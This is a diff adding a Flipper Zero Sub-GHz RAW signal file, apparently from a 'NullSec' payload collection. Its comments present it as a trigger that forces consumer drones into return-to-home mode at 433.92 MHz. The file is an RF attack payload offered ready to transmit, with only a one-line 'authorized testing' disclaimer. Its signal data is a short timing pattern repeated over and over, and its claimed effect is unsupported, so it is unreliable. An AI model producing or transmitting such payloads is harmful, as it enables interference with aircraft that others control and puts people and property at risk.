@@ -1,0 +1,9 @@
+Filetype: Flipper SubGhz RAW File
+Version: 1
+Frequency: 433920000
+Preset: FuriHalSubGhzPresetOok650Async
+Protocol: RAW
+# NullSec - Drone Return-to-Home Trigger
+# May trigger RTH on some consumer drones
+# For authorized drone security testing
+RAW_Data: 200 -400 200 -200 400 -200 200 -400 200 -200 200 -200 400 -400 200 -200 400 -200 200 -400 200 -200 200 -200 400 -400 200 -200 400 -200 200 -400 200 -200 200 -200 400 -400 200 -200 400 -200 200 -400 200 -200 200 -200 400 -400 200 -200 400 -200 200 -400 200 -200 200 -200 400 -400 200 -200 400 -200 200 -400 200 -200 200 -200 400 -400 200 -200 400 -200
